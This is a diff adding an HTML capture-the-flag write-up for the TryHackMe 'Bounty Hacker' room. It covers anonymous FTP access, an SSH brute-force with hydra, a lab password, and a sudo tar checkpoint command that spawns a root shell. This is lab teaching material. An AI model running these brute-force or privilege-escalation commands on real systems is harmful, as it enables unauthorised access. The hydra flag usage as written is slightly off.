@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>bounty hacker</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>bounty hacker</h1><br/><p><strong><h1>THM Bounty Hacker</h1></strong><em><span style="text-decoration:underline;"></span></em></p><p><em><span style="text-decoration:underline;"></span></em></p><p></p><p><strong><h2>Enumeration</h2></strong></p><p></p><p></p><p><strong>Rustscan</strong></p><p><img src="images/24-1.png" alt="images/24-1.png" /></p><p></p><p><strong>Nmap</strong></p><p><img src="images/24-2.png" alt="images/24-2.png" /></p><p></p><p></p><p><strong>Web Directory Search </strong></p><p><img src="images/24-3.png" alt="images/24-3.png" /></p><p></p><p><strong>FTP as Port 21 is running vsftpd</strong> (Logged in as <strong>anonymous</strong>)</p><p><img src="images/24-4.png" alt="images/24-4.png" /></p><p></p><p>we get 2 files. Following are the contents</p><p></p><p><img src="images/24-5.png" alt="images/24-5.png" /></p><p></p><p></p><p><strong><h2>Foothold</h2></strong></p><p></p><p>We use <strong>hydra</strong> to bruteforce ssh with user <strong>“lin”</strong> and passwords we found in <strong>locks.txt</strong></p><p></p><p><strong>hydra -l lin -p locks.txt -vv 10.10.130.84 ssh</strong></p><p></p><p><img src="images/24-6.png" alt="images/24-6.png" /></p><p></p><p>User Password: <strong>RedDr4gonSynd1cat3</strong></p><p></p><p><strong><h2>Privilege Escalation</h2></strong></p><p></p><p>we check sudo permissions. /bin/tar was allowed to run with sudo.</p><p>we check GTFOBins and get the command</p><p></p><p><strong>sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash</strong></p><p></p><p><img src="images/24-7.png" alt="images/24-7.png" /></p><p></p><p>Thanks !!</p></div>
+</body>
+</html>
